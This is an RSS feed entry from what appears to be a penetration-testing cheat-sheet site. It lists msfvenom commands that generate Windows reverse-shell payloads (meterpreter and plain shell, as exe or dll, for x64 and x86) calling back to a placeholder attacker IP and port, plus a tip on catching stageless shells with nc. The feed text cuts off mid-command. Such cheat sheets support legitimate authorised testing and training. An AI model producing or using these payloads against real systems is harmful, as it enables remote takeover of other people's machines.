channel.title: Msfvenom on TLDRBins
channel.description: Recent content in Msfvenom on TLDRBins

item.title: Metasploit Shellcode
item.description: Generate Shellcode Note: stageless payload can catch with nc directly Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll Windows x86 Staged exe Stageless exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.
